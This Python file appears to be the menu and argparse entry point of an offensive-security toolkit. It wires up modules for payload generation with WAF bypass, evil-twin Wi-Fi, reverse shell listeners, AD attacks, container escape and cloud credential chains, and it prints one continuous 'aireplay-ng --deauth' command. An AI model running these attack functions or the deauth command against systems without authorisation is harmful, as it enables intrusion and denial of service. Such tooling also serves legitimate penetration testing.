"""
CyberSec Toolkit — точка входа.
Author: idqwixxa
"""
import sys
import argparse
import importlib
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm

from core.banner import show_banner
from core.logger import get_logger
from core.database import db

console = Console()
log = get_logger(__name__)


class _LazyModule:
    def __init__(self, module_name: str) -> None:
        self._module_name = module_name
        self._module = None

    def _load(self):
        if self._module is None:
            self._module = importlib.import_module(self._module_name)
        return self._module

    def __getattr__(self, name: str):
        return getattr(self._load(), name)


# ============================================================================
# Lazy-модули
# ============================================================================

recon               = _LazyModule("modules.recon")
web_vuln            = _LazyModule("modules.web_vuln")
passwords           = _LazyModule("modules.passwords")
osint               = _LazyModule("modules.osint")
network             = _LazyModule("modules.network")
bugbounty           = _LazyModule("modules.bugbounty")
roadmap             = _LazyModule("modules.roadmap")
utils_tools         = _LazyModule("modules.utils_tools")
censys_lookup       = _LazyModule("modules.censys_lookup")
async_engine        = _LazyModule("modules.async_engine")
wordlist_updater    = _LazyModule("modules.wordlist_updater")
screenshot          = _LazyModule("modules.screenshot")
report_export       = _LazyModule("modules.report_export")
scheduler           = _LazyModule("modules.scheduler")
notifier            = _LazyModule("modules.notifier")
stego_pro           = _LazyModule("modules.stego_pro")
wordlist_tools      = _LazyModule("modules.wordlist_tools")
payload_factory     = _LazyModule("modules.payload_factory")
web_crawler         = _LazyModule("modules.web_crawler")
telegram_bot        = _LazyModule("modules.telegram_bot")
web_fuzzer          = _LazyModule("modules.web_fuzzer")
stats               = _LazyModule("modules.stats")
vault               = _LazyModule("modules.vault")
notes               = _LazyModule("modules.notes")
auto_report         = _LazyModule("modules.auto_report")
http_proxy          = _LazyModule("modules.http_proxy")
shell_manager       = _LazyModule("modules.shell_manager")

dns_tools           = _LazyModule("modules.dns_tools")
subdomain_takeover  = _LazyModule("modules.subdomain_takeover")
subdomain_takeover_v2 = _LazyModule("modules.subdomain_takeover_v2")
subdomain_monitor   = _LazyModule("modules.subdomain_monitor")
osint_pro           = _LazyModule("modules.osint_pro")
cve_feeds           = _LazyModule("modules.cve_feeds")
threat_intel        = _LazyModule("modules.threat_intel")
threat_hunting      = _LazyModule("modules.threat_hunting")

wordpress_scanner   = _LazyModule("modules.wordpress_scanner")
graphql_discovery   = _LazyModule("modules.graphql_discovery")
graphql_security    = _LazyModule("modules.graphql_security")
api_fuzzer          = _LazyModule("modules.api_fuzzer")
js_secrets          = _LazyModule("modules.js_secrets")
cache_poisoning     = _LazyModule("modules.cache_poisoning")

cloud_storage       = _LazyModule("modules.cloud_storage")
cloud_iam           = _LazyModule("modules.cloud_iam")
cloud_attack_pro    = _LazyModule("modules.cloud_attack_pro")

ad_attack           = _LazyModule("modules.ad_attack")
k8s_scanner         = _LazyModule("modules.k8s_scanner")
container_escape    = _LazyModule("modules.container_escape")
db_attack           = _LazyModule("modules.db_attack")

wireless_toolkit    = _LazyModule("modules.wireless_toolkit")
wireless_attack     = _LazyModule("modules.wireless_attack")
wireless_attack_pro = _LazyModule("modules.wireless_attack_pro")

pivot_helper        = _LazyModule("modules.pivot_helper")
redteam_c2          = _LazyModule("modules.redteam_c2")
shell_listener_pro  = _LazyModule("modules.shell_listener_pro")
adversary_emulation = _LazyModule("modules.adversary_emulation")

bugbounty_autoscan  = _LazyModule("modules.bugbounty_autoscan")
bugbounty_autopilot = _LazyModule("modules.bugbounty_autopilot")
report_pack         = _LazyModule("modules.report_pack")

social_engineer     = _LazyModule("modules.social_engineer")
ssrf_pro            = _LazyModule("modules.ssrf_pro")
hash_suite          = _LazyModule("modules.hash_suite")
pcap_analysis       = _LazyModule("modules.pcap_analysis")
forensics_ir        = _LazyModule("modules.forensics_ir")
re_suite            = _LazyModule("modules.re_suite")
mobile_security     = _LazyModule("modules.mobile_security")
web3_security       = _LazyModule("modules.web3_security")

compliance_audit    = _LazyModule("modules.compliance_audit")
plugin_sdk          = _LazyModule("modules.plugin_sdk")
plugin_loader       = _LazyModule("core.plugin_loader")


# ============================================================================
# Адаптеры (там где API модулей не совпадает с CLI)
# ============================================================================

def _wa_tools() -> None:
    wireless_attack._print_tools_table()


def _wa_ifaces() -> None:
    wireless_attack.show_interfaces()


def _wa_wpa(iface: str = "wlan0") -> None:
    wireless_attack.show_wpa_workflow(iface=iface)


def _wa_pmkid(iface: str = "wlan0") -> None:
    wireless_attack.show_pmkid_workflow(iface=iface)


def _wa_wps(iface: str = "wlan0",
            bssid: str = "AA:BB:CC:DD:EE:FF") -> None:
    wireless_attack.show_wps_workflow(iface=iface, bssid=bssid)


def _wa_evil(ssid: str = "Free WiFi", iface: str = "wlan0") -> None:
    wireless_attack.generate_evil_twin(ssid=ssid, iface=iface)


def _wa_deauth(iface: str = "wlan0mon") -> None:
    console.print("[yellow]Deauth — см. cheat-sheet evil-twin[/yellow]")
    console.print(f"[cyan]sudo aireplay-ng --deauth 0 -a <BSSID> {iface}"
                  f"[/cyan]")


def _sdk_list() -> None:
    plugin_sdk.list_plugins_detailed()


def _sdk_validate() -> None:
    plugin_sdk.validate_all_plugins()


def _sdk_docs() -> None:
    console.print(plugin_sdk.API_DOCS)


def _sdk_templates() -> None:
    t = Table(title=f"Шаблоны плагинов ({len(plugin_sdk.TEMPLATES)})")
    t.add_column("Ключ", style="cyan")
    for k in plugin_sdk.TEMPLATES:
        t.add_row(k)
    console.print(t)


def _sdk_generate(name: str, template: str = "basic") -> None:
    plugin_sdk.generate_plugin(name=name, template=template)


# ============================================================================
# МЕНЮ
# ============================================================================

MENU = [
    ("1",  "Reconnaissance",                                     lambda: recon.menu()),
    ("2",  "DNS Tools (AXFR/DNSSEC/PTR/SPF)",                    lambda: dns_tools.menu()),
    ("3",  "OSINT (username/HIBP/EXIF)",                         lambda: osint.menu()),
    ("4",  "OSINT Pro (100+ платформ, Wayback, RDAP)",           lambda: osint_pro.menu()),
    ("5",  "Censys (хосты/сертификаты)",                         lambda: censys_lookup.menu()),
    ("6",  "CVE Feeds (NVD + CISA KEV + dorks)",                 lambda: cve_feeds.menu()),
    ("7",  "Threat Intelligence Lookup",                         lambda: threat_intel.menu()),
    ("8",  "Threat Hunting (Sigma + MITRE)",                     lambda: threat_hunting.menu()),
    ("9",  "Async Engine (быстрый портскан/HTTP)",               lambda: async_engine.menu()),
    ("10", "Subdomain Takeover Detector",                        lambda: subdomain_takeover.menu()),
    ("11", "Subdomain Takeover v2 (100+ сервисов)",              lambda: subdomain_takeover_v2.menu()),
    ("12", "Subdomain Monitor (watch-list + diff + alerts)",     lambda: subdomain_monitor.menu()),
    ("13", "Cloud Storage Enum (S3/GCS/Azure)",                  lambda: cloud_storage.menu()),

    ("20", "Web Vulnerabilities (SQLi/XSS/LFI/...)",             lambda: web_vuln.menu()),
    ("21", "WordPress Scanner",                                  lambda: wordpress_scanner.menu()),
    ("22", "GraphQL / API Discovery",                            lambda: graphql_discovery.menu()),
    ("23", "GraphQL Security Suite (introspection/DoS)",         lambda: graphql_security.menu()),
    ("24", "API Fuzzing Suite (OpenAPI, BOLA, rate-limit)",      lambda: api_fuzzer.menu()),
    ("25", "JS Secrets Scanner (30+ паттернов)",                 lambda: js_secrets.menu()),
    ("26", "Web Cache Poisoning Suite",                          lambda: cache_poisoning.menu()),
    ("27", "Web Crawler",                                        lambda: web_crawler.menu()),
    ("28", "Web Fuzzer (ffuf-like)",                             lambda: web_fuzzer.menu()),
    ("29", "Payload Factory (XSS/SQLi/LFI + обход WAF)",         lambda: payload_factory.menu()),

    ("30", "Passwords & Hashes",                                 lambda: passwords.menu()),
    ("31", "Hash Cracking Suite (wordlist/rules/mask)",          lambda: hash_suite.menu()),
    ("32", "Password Vault (шифрованное)",                       lambda: vault.menu()),

    ("40", "Cloud IAM Analyzer (AWS/GCP/Azure)",                 lambda: cloud_iam.menu()),
    ("41", "Cloud Attack Pro (IMDS/SSRF→IAM)",                   lambda: cloud_attack_pro.menu()),

    ("45", "Active Directory Attack Suite",                      lambda: ad_attack.menu()),
    ("46", "Kubernetes / Container Scanner",                     lambda: k8s_scanner.menu()),
    ("47", "Container Escape Suite",                             lambda: container_escape.menu()),
    ("48", "Database Attack Helper",                             lambda: db_attack.menu()),

    ("55", "Network (ARP, sniff, MITM)",                         lambda: network.menu()),
    ("56", "Wireless Toolkit (Wi-Fi анализ)",                    lambda: wireless_toolkit.menu()),
    ("57", "Wireless Attack Helper (WPA/PMKID/WPS)",             lambda: wireless_attack.menu()),
    ("58", "Wireless Attack Pro (WPA3/KARMA/Pixie)",             lambda: wireless_attack_pro.menu()),
    ("59", "Packet Analysis (PCAP)",                             lambda: pcap_analysis.menu()),

    ("65", "Pivot / Post-Exploitation Helpers",                  lambda: pivot_helper.menu()),
    ("66", "Red Team C2 (Sliver/Havoc/Mythic)",                  lambda: redteam_c2.menu()),
    ("67", "Shell Manager (basic)",                              lambda: shell_manager.menu()),
    ("68", "Reverse Shell Listener Pro (multi-session)",         lambda: shell_listener_pro.menu()),
    ("69", "Adversary Emulation (MITRE ATT&CK)",                 lambda: adversary_emulation.menu()),

    ("75", "Bug Bounty (CVSS, отчёты)",                          lambda: bugbounty.menu()),
    ("76", "Bug Bounty Auto-Scan (пайплайн)",                    lambda: bugbounty_autoscan.menu()),
    ("77", "Bug Bounty Autopilot (full auto)",                   lambda: bugbounty_autopilot.menu()),
    ("78", "Report Templates Pack (H1/Bugcrowd)",                lambda: report_pack.menu()),
    ("79", "Report Export (HTML/PDF/Markdown)",                  lambda: report_export.menu()),
    ("80", "Auto-Report Pro (единый отчёт)",                     lambda: auto_report.menu()),

    ("85", "Social Engineering Toolkit (CTF)",                   lambda: social_engineer.menu()),
    ("86", "SSRF Pro (cloud metadata + payloads)",               lambda: ssrf_pro.menu()),
    ("87", "Web3 / Blockchain Security",                         lambda: web3_security.menu()),
    ("88", "Mobile App Security (APK/IPA)",                      lambda: mobile_security.menu()),
    ("89", "Reverse Engineering Suite",                          lambda: re_suite.menu()),
    ("90", "Forensics & IR",                                     lambda: forensics_ir.menu()),

    ("95", "HTTP/HTTPS Proxy (MITM)",                            lambda: http_proxy.menu()),
    ("96", "Steganography Pro (PNG/WAV + AES)",                  lambda: stego_pro.menu()),
    ("97", "Утилиты (encode/crypto/stego)",                      lambda: utils_tools.menu()),
    ("98", "Screenshot (снимки сайтов)",                         lambda: screenshot.menu()),

    ("100", "Wordlist Updater (словари с GitHub)",               lambda: wordlist_updater.menu()),
    ("101", "Wordlist Tools (генератор hashcat-like)",           lambda: wordlist_tools.menu()),

    ("105", "Notes & Findings",                                  lambda: notes.menu()),
    ("106", "Graph & Statistics (графики)",                      lambda: stats.menu()),
    ("107", "Scheduler (планировщик задач)",                     lambda: scheduler.menu()),
    ("108", "Notifier (Telegram/Discord/Email)",                 lambda: notifier.menu()),
    ("109", "Telegram Bot (управление из чата)",                 lambda: telegram_bot.menu()),

    ("115", "Плагины (расширения)",                              lambda: plugin_loader.plugin_menu()),
    ("116", "Plugin SDK (генератор плагинов)",                   lambda: plugin_sdk.menu()),
    ("117", "Compliance & Audit (CIS/OWASP/PCI)",                lambda: compliance_audit.menu()),

    ("120", "Roadmap / Обучение",                                lambda: roadmap.menu()),

    ("900", "История сканов",                                    None),
    ("0",   "Выход",                                             None),
]


def show_menu() -> None:
    table = Table(title="[bold cyan]ГЛАВНОЕ МЕНЮ[/bold cyan]  "
                        "[magenta]by idqwixxa[/magenta]")
    table.add_column("№", style="bold yellow", width=5)
    table.add_column("Модуль", style="white")
    for num, title, _ in MENU:
        table.add_row(num, title)
    console.print(table)


def show_history() -> None:
    rows = db.history(20)
    if not rows:
        console.print("[yellow]История пуста.[/yellow]")
        return
    table = Table(title="Последние сканы")
    table.add_column("ID", style="cyan")
    table.add_column("Модуль", style="magenta")
    table.add_column("Цель", style="green")
    table.add_column("Дата", style="white")
    for r in rows:
        table.add_row(str(r["id"]), r["module"], r["target"],
                      str(r["created_at"]))
    console.print(table)


def interactive() -> None:
    if not Confirm.ask(
        "[bold red]Подтверждаешь этичное использование?[/bold red]",
        default=False,
    ):
        console.print("[red]Выход.[/red]")
        sys.exit(1)
    while True:
        console.print()
        show_menu()
        choice = Prompt.ask("[bold green]Выбери пункт[/bold green]",
                            default="0")
        if choice == "0":
            console.print("[bold cyan]До встречи, хакер![/bold cyan]")
            break
        if choice == "900":
            show_history()
            continue
        entry = next((m for m in MENU if m[0] == choice), None)
        if not entry or entry[2] is None:
            console.print("[red]Неверный пункт.[/red]")
            continue
        try:
            entry[2]()
        except KeyboardInterrupt:
            console.print("\n[yellow]Прервано.[/yellow]")
        except Exception as exc:  # noqa: BLE001
            log.exception("Ошибка модуля: %s", exc)
            console.print(f"[red]Ошибка: {exc}[/red]")


# ============================================================================
# ARGPARSE
# ============================================================================

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="cyber_toolkit",
        description="CyberSec Toolkit — CLI (by idqwixxa)",
    )
    p.add_argument("--no-banner", action="store_true")
    p.add_argument("--tui", action="store_true")
    sub = p.add_subparsers(dest="cmd")

    # ---------- Recon ----------
    s = sub.add_parser("whois"); s.add_argument("target")
    s = sub.add_parser("dns"); s.add_argument("target")
    s = sub.add_parser("subdomain"); s.add_argument("target")
    s = sub.add_parser("portscan")
    s.add_argument("target")
    s.add_argument("-p", "--ports", default="1-1024")
    s = sub.add_parser("geoip"); s.add_argument("target")
    s = sub.add_parser("fingerprint"); s.add_argument("url")
    s = sub.add_parser("dork"); s.add_argument("domain")
    s = sub.add_parser("shodan"); s.add_argument("query")

    # ---------- Web ----------
    s = sub.add_parser("headers"); s.add_argument("url")
    s = sub.add_parser("ssl"); s.add_argument("host")
    s = sub.add_parser("sqli"); s.add_argument("url")
    s = sub.add_parser("xss"); s.add_argument("url")
    s = sub.add_parser("lfi"); s.add_argument("url")
    s = sub.add_parser("dirb"); s.add_argument("url")
    s = sub.add_parser("cms"); s.add_argument("url")
    s = sub.add_parser("redirect"); s.add_argument("url")
    s = sub.add_parser("csrf"); s.add_argument("url")

    # ---------- Passwords ----------
    s = sub.add_parser("hashid"); s.add_argument("hash")
    s = sub.add_parser("crack"); s.add_argument("hash")
    s = sub.add_parser("genpass")
    s.add_argument("-l", "--length", type=int, default=16)

    # ---------- OSINT ----------
    s = sub.add_parser("username"); s.add_argument("username")
    s = sub.add_parser("hibp"); s.add_argument("email")
    s = sub.add_parser("phone"); s.add_argument("phone")
    s = sub.add_parser("exif"); s.add_argument("path")
    s = sub.add_parser("ghdork"); s.add_argument("query")

    # ---------- OSINT Pro ----------
    sub.add_parser("osint-pro")
    s = sub.add_parser("op-username"); s.add_argument("username")
    s = sub.add_parser("op-telegram"); s.add_argument("username")
    s = sub.add_parser("op-gravatar"); s.add_argument("email")
    s = sub.add_parser("op-wayback"); s.add_argument("domain")
    s = sub.add_parser("op-age"); s.add_argument("domain")
    s = sub.add_parser("op-dns"); s.add_argument("domain")
    s = sub.add_parser("op-github"); s.add_argument("username")
    s = sub.add_parser("op-email"); s.add_argument("email")
    s = sub.add_parser("op-image"); s.add_argument("url")

    # ---------- Censys ----------
    s = sub.add_parser("censys"); s.add_argument("query")
    s = sub.add_parser("censys-host"); s.add_argument("ip")
    s = sub.add_parser("censys-cert"); s.add_argument("sha256")

    # ---------- Async ----------
    s = sub.add_parser("asyncscan")
    s.add_argument("target")
    s.add_argument("-p", "--ports", default="1-1024")
    s.add_argument("-c", "--concurrency", type=int, default=500)
    s = sub.add_parser("asyncweb")
    s.add_argument("url")
    s.add_argument("-P", "--paths",
                   default="admin,login,api,robots.txt,.env")
    s.add_argument("-c", "--concurrency", type=int, default=50)

    # ---------- Wordlists ----------
    s = sub.add_parser("wordlists-update")
    s.add_argument("--check", action="store_true")
    s = sub.add_parser("wordlist-gen")
    s.add_argument("word")
    s.add_argument("-o", "--out", default="custom_wordlist.txt")
    s.add_argument("--no-leet", action="store_true")
    s.add_argument("--no-years", action="store_true")
    s.add_argument("--no-symbols", action="store_true")

    # ---------- Payloads ----------
    s = sub.add_parser("payload")
    s.add_argument("kind",
                   choices=["xss", "sqli", "lfi", "ssrf", "cmdi", "ssti"])
    s.add_argument("--encode",
                   choices=["none", "url", "double-url", "hex",
                            "unicode", "base64"], default="none")
    s.add_argument("--obfuscate", action="store_true")
    s.add_argument("--count", type=int, default=10)

    # ---------- Crawler / Fuzzer ----------
    s = sub.add_parser("crawl")
    s.add_argument("url")
    s.add_argument("-d", "--depth", type=int, default=1)
    s.add_argument("-m", "--max-pages", type=int, default=50)

    s = sub.add_parser("fuzz")
    s.add_argument("mode", choices=["paths", "params", "headers"])
    s.add_argument("url")
    s.add_argument("-w", "--wordlist", default=None)
    s.add_argument("-t", "--threads", type=int, default=20)
    s.add_argument("-H", "--header", default="User-Agent")

    # ---------- Screenshot ----------
    s = sub.add_parser("screenshot")
    s.add_argument("url")
    s.add_argument("--no-full", action="store_true")

    # ---------- Reports ----------
    s = sub.add_parser("export-html")
    s.add_argument("-n", "--limit", type=int, default=500)
    s = sub.add_parser("export-pdf")
    s.add_argument("-n", "--limit", type=int, default=300)
    s = sub.add_parser("export-scan")
    s.add_argument("scan_id", type=int)

    sub.add_parser("stats")
    s = sub.add_parser("stats-graphs")
    s.add_argument("--open", action="store_true")

    # ---------- Plugins ----------
    sub.add_parser("plugins")
    sub.add_parser("plugins-menu")
    sub.add_parser("plugins-reload")
    s = sub.add_parser("plugin-run")
    s.add_argument("key")
    s.add_argument("arg", nargs="?", default=None)

    # ---------- Vault ----------
    sub.add_parser("vault")
    sub.add_parser("vault-status")
    sub.add_parser("vault-init")
    s = sub.add_parser("vault-add")
    s.add_argument("title", nargs="?", default=None)
    s.add_argument("--username", "-u", default=None)
    s.add_argument("--password", "-p", default=None)
    s.add_argument("--url", default=None)
    s.add_argument("--notes", default=None)
    s.add_argument("--generate", "-g", action="store_true")
    s.add_argument("--length", "-l", type=int, default=20)
    s = sub.add_parser("vault-get"); s.add_argument("title")
    sub.add_parser("vault-list")
    s = sub.add_parser("vault-search"); s.add_argument("query")
    s = sub.add_parser("vault-del"); s.add_argument("title")
    s = sub.add_parser("vault-export"); s.add_argument("out")
    s = sub.add_parser("vault-import"); s.add_argument("in_path")
    sub.add_parser("vault-change-master")

    # ---------- Notes ----------
    sub.add_parser("notes")
    sub.add_parser("note-stats")
    s = sub.add_parser("note-add")
    s.add_argument("title", nargs="?", default=None)
    s.add_argument("-b", "--body", default=None)
    s.add_argument("-t", "--target", default=None)
    s.add_argument("--tags", default=None)
    s = sub.add_parser("finding-add")
    s.add_argument("title", nargs="?", default=None)
    s.add_argument("-b", "--body", default=None)
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-s", "--severity",
                   choices=["info", "low", "medium", "high", "critical"],
                   default=None)
    s.add_argument("--status",
                   choices=["open", "in-progress", "resolved",
                            "wontfix", "dup", "invalid"], default=None)
    s.add_argument("--tags", default=None)
    s = sub.add_parser("note-list")
    s.add_argument("--kind", choices=["note", "finding"], default=None)
    s.add_argument("-t", "--target", default=None)
    s.add_argument("--status", default=None)
    s.add_argument("--severity", default=None)
    s.add_argument("--tag", default=None)
    s = sub.add_parser("note-show"); s.add_argument("id", type=int)
    s = sub.add_parser("note-del"); s.add_argument("id", type=int)
    s = sub.add_parser("note-edit"); s.add_argument("id", type=int)
    s = sub.add_parser("note-search"); s.add_argument("query")
    s = sub.add_parser("findings-export")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-o", "--out", default=None)
    s.add_argument("--fmt",
                   choices=["md", "json", "csv", "html", "kanban"],
                   default="md")

    # ---------- Auto-Report ----------
    sub.add_parser("report-pro")
    s = sub.add_parser("report-pro-html")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-o", "--out", default=None)
    s.add_argument("--template",
                   choices=["default", "hackerone", "bugcrowd",
                            "pentest"], default="default")
    s.add_argument("--open", action="store_true")
    s = sub.add_parser("report-pro-pdf")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-o", "--out", default=None)
    s.add_argument("--template",
                   choices=["default", "hackerone", "bugcrowd",
                            "pentest"], default="default")
    s.add_argument("--open", action="store_true")
    s = sub.add_parser("report-pro-json")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-o", "--out", default=None)
    s = sub.add_parser("report-pro-md")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-o", "--out", default=None)
    sub.add_parser("report-pro-diff")

    # ---------- Proxy ----------
    sub.add_parser("proxy")
    s = sub.add_parser("proxy-start")
    s.add_argument("-p", "--port", type=int, default=8080)
    s.add_argument("--no-mitm", action="store_true")
    sub.add_parser("proxy-status")
    sub.add_parser("proxy-ca")
    sub.add_parser("proxy-rules")
    sub.add_parser("proxy-rules-clear")
    s = sub.add_parser("proxy-rule-add")
    s.add_argument("target", choices=["request", "response"])
    s.add_argument("action",
                   choices=["replace", "add-header", "remove-header",
                            "drop", "inject-body"])
    s.add_argument("match")
    s.add_argument("--replace", default="")
    s.add_argument("--header-name", default="")
    s.add_argument("--header-value", default="")

    # ---------- Shell ----------
    sub.add_parser("shell")
    sub.add_parser("shell-status")
    sub.add_parser("shell-list")
    s = sub.add_parser("shell-start")
    s.add_argument("-H", "--host", default="0.0.0.0")
    s.add_argument("-p", "--port", type=int, default=4444)
    sub.add_parser("shell-stop")

    # ---------- DNS Tools ----------
    sub.add_parser("dns-tools")
    s = sub.add_parser("dns-axfr"); s.add_argument("domain")
    s = sub.add_parser("dns-dnssec"); s.add_argument("domain")
    s = sub.add_parser("dns-wildcard"); s.add_argument("domain")
    s = sub.add_parser("dns-ptr"); s.add_argument("cidr")
    s.add_argument("-t", "--threads", type=int, default=50)
    s = sub.add_parser("dns-snoop")
    s.add_argument("domain")
    s.add_argument("-r", "--resolver", default=None)
    s = sub.add_parser("dns-cname"); s.add_argument("domain")
    s = sub.add_parser("dns-srv"); s.add_argument("domain")
    s = sub.add_parser("dns-mail"); s.add_argument("domain")
    s = sub.add_parser("dns-rebinding"); s.add_argument("domain")

    # ---------- Takeover ----------
    sub.add_parser("takeover")
    s = sub.add_parser("takeover-scan")
    s.add_argument("domain")
    s.add_argument("-w", "--wordlist", default="subdomains.txt")
    s.add_argument("-t", "--threads", type=int, default=30)
    s = sub.add_parser("takeover-check"); s.add_argument("subdomain")
    s = sub.add_parser("takeover-batch")
    s.add_argument("source")
    s.add_argument("-t", "--threads", type=int, default=20)
    sub.add_parser("takeover-services")

    # ---------- Takeover v2 ----------
    sub.add_parser("takeover-v2")
    s = sub.add_parser("takeover-v2-scan")
    s.add_argument("domain")
    s.add_argument("-w", "--wordlist", default="subdomains.txt")
    s.add_argument("-t", "--threads", type=int, default=30)
    s = sub.add_parser("takeover-v2-check"); s.add_argument("subdomain")
    s = sub.add_parser("takeover-v2-batch")
    s.add_argument("source")
    s.add_argument("-t", "--threads", type=int, default=20)
    sub.add_parser("takeover-v2-services")
    sub.add_parser("takeover-v2-history")

    # ---------- Monitor ----------
    sub.add_parser("monitor")
    s = sub.add_parser("monitor-add")
    s.add_argument("domain")
    s.add_argument("-i", "--interval", type=int, default=360)
    s = sub.add_parser("monitor-rm"); s.add_argument("domain")
    sub.add_parser("monitor-list")
    s = sub.add_parser("monitor-scan")
    s.add_argument("domain")
    s.add_argument("--takeover", action="store_true")
    sub.add_parser("monitor-scan-all")
    s = sub.add_parser("monitor-history"); s.add_argument("domain")

    # ---------- CVE ----------
    sub.add_parser("cve")
    s = sub.add_parser("cve-download")
    s.add_argument("-k", "--keyword", default="")
    s.add_argument("-d", "--days", type=int, default=0)
    s.add_argument("-n", "--max", type=int, default=500,
                   dest="max_results")
    s = sub.add_parser("cve-search")
    s.add_argument("keyword")
    s.add_argument("--min-score", type=float, default=None)
    s.add_argument("--kev", action="store_true")
    s.add_argument("-n", "--limit", type=int, default=30)
    s = sub.add_parser("cve-top")
    s.add_argument("-d", "--days", type=int, default=7)
    s.add_argument("--min-score", type=float, default=7.0)
    s.add_argument("-n", "--limit", type=int, default=50)
    s = sub.add_parser("cve-kev")
    s.add_argument("-n", "--limit", type=int, default=100)
    sub.add_parser("cve-kev-update")
    s = sub.add_parser("cve-show")
    s.add_argument("cve_id")
    s = sub.add_parser("cve-dorks")
    s.add_argument("product")
    s.add_argument("--version", default="")
    s.add_argument("--cve-id", default="")
    sub.add_parser("cve-stats")

    # ---------- WiFi ----------
    sub.add_parser("wifi")
    sub.add_parser("wifi-scan")
    sub.add_parser("wifi-evil")
    sub.add_parser("wifi-open")
    sub.add_parser("wifi-weak")
    sub.add_parser("wifi-channels")
    sub.add_parser("wifi-top")
    sub.add_parser("wifi-export-csv")
    sub.add_parser("wifi-export-json")
    sub.add_parser("wifi-full")

    # ---------- WordPress ----------
    sub.add_parser("wp")
    s = sub.add_parser("wp-scan")
    s.add_argument("url")
    s.add_argument("--aggressive", action="store_true")
    s = sub.add_parser("wp-detect"); s.add_argument("url")
    s = sub.add_parser("wp-users"); s.add_argument("url")
    s = sub.add_parser("wp-plugins"); s.add_argument("url")
    s = sub.add_parser("wp-xmlrpc"); s.add_argument("url")
    s = sub.add_parser("wp-vulns"); s.add_argument("url")
    s = sub.add_parser("wp-rest"); s.add_argument("url")

    # ---------- GraphQL / API ----------
    sub.add_parser("gql")
    s = sub.add_parser("gql-scan"); s.add_argument("url")
    s = sub.add_parser("gql-discover"); s.add_argument("url")
    s = sub.add_parser("gql-introspect"); s.add_argument("endpoint")
    s = sub.add_parser("api-swagger"); s.add_argument("url")
    s = sub.add_parser("api-rest"); s.add_argument("url")
    s = sub.add_parser("api-js"); s.add_argument("url")

    # ---------- GraphQL Security ----------
    sub.add_parser("gql-sec")
    s = sub.add_parser("gql-sec-scan"); s.add_argument("endpoint")
    s = sub.add_parser("gql-sec-introspect"); s.add_argument("endpoint")
    s = sub.add_parser("gql-sec-suggest"); s.add_argument("endpoint")
    s = sub.add_parser("gql-sec-batch"); s.add_argument("endpoint")
    s.add_argument("-n", "--count", type=int, default=10)
    s = sub.add_parser("gql-sec-alias"); s.add_argument("endpoint")
    s.add_argument("-n", "--count", type=int, default=100)
    s = sub.add_parser("gql-sec-csrf"); s.add_argument("endpoint")

    # ---------- API Fuzzer ----------
    sub.add_parser("api-fuzz")
    s = sub.add_parser("api-fuzz-scan")
    s.add_argument("spec")
    s.add_argument("--base-url", default="")
    s.add_argument("--auth", default="")
    s = sub.add_parser("api-fuzz-ratelimit")
    s.add_argument("url")
    s.add_argument("-n", "--count", type=int, default=50)
    s = sub.add_parser("api-fuzz-graphql"); s.add_argument("url")
    s = sub.add_parser("api-fuzz-bola")
    s.add_argument("base")
    s.add_argument("endpoint")
    s.add_argument("--param", default="id")

    # ---------- JS Secrets ----------
    sub.add_parser("secrets")
    s = sub.add_parser("secrets-scan")
    s.add_argument("url")
    s.add_argument("--validate", action="store_true")
    s = sub.add_parser("secrets-js")
    s.add_argument("url")
    s.add_argument("--validate", action="store_true")

    # ---------- Cache Poisoning ----------
    sub.add_parser("cache-poison")
    s = sub.add_parser("cache-scan"); s.add_argument("url")
    s = sub.add_parser("cache-unkeyed"); s.add_argument("url")
    s = sub.add_parser("cache-deception"); s.add_argument("url")
    s = sub.add_parser("cache-vary"); s.add_argument("url")
    s = sub.add_parser("cache-fat"); s.add_argument("url")
    s = sub.add_parser("cache-param"); s.add_argument("url")
    s = sub.add_parser("cache-host"); s.add_argument("url")

    # ---------- Cloud IAM ----------
    sub.add_parser("cloud-iam")
    s = sub.add_parser("cloud-iam-aws")
    s.add_argument("--profile", default="")
    s = sub.add_parser("cloud-iam-gcp")
    s.add_argument("--creds", default=None)
    sub.add_parser("cloud-iam-azure")
    sub.add_parser("cloud-iam-env")
    sub.add_parser("cloud-iam-files")
    sub.add_parser("cloud-iam-full")

    # ---------- Cloud Storage ----------
    sub.add_parser("cloud")
    s = sub.add_parser("cloud-scan")
    s.add_argument("domain")
    s.add_argument("--provider", choices=["s3", "gcs"], default="s3")
    s.add_argument("-t", "--threads", type=int, default=30)
    s = sub.add_parser("cloud-all")
    s.add_argument("domain")
    s.add_argument("-t", "--threads", type=int, default=30)
    s = sub.add_parser("cloud-check")
    s.add_argument("name")
    s.add_argument("--provider", choices=["s3", "gcs"], default="s3")
    s = sub.add_parser("cloud-batch")
    s.add_argument("source")
    s.add_argument("--provider", choices=["s3", "gcs"], default="s3")
    s.add_argument("-t", "--threads", type=int, default=20)
    s = sub.add_parser("cloud-azure"); s.add_argument("account")
    sub.add_parser("cloud-providers")

    # ---------- Cloud Attack Pro ----------
    sub.add_parser("cap")
    s = sub.add_parser("cap-imds"); s.add_argument("--provider", default=None)
    sub.add_parser("cap-privesc")
    sub.add_parser("cap-ssrf-headers")
    s = sub.add_parser("cap-aws-chain")
    s.add_argument("access_key"); s.add_argument("secret_key")
    s.add_argument("--token", default="")
    s = sub.add_parser("cap-metadata-ssrf"); s.add_argument("url")
    s = sub.add_parser("cap-dorks"); s.add_argument("org")
    sub.add_parser("cap-lambda")
    sub.add_parser("cap-ip-bypass")

    # ---------- AD Attack ----------
    sub.add_parser("ad")
    sub.add_parser("ad-tools")
    sub.add_parser("ad-cheatsheets")
    s = sub.add_parser("ad-cheat"); s.add_argument("name")
    s = sub.add_parser("ad-smb-signing"); s.add_argument("dc")
    s = sub.add_parser("ad-ldap-anon"); s.add_argument("dc")
    s = sub.add_parser("ad-null-session"); s.add_argument("dc")

    # ---------- K8s ----------
    sub.add_parser("k8s")
    s = sub.add_parser("k8s-scan")
    s.add_argument("host"); s.add_argument("-p", "--ports", default=None)
    s = sub.add_parser("k8s-api"); s.add_argument("host")
    s = sub.add_parser("k8s-etcd"); s.add_argument("host")
    s = sub.add_parser("k8s-docker"); s.add_argument("host")
    sub.add_parser("k8s-escape")
    sub.add_parser("k8s-ports")
    sub.add_parser("k8s-cve-kb")

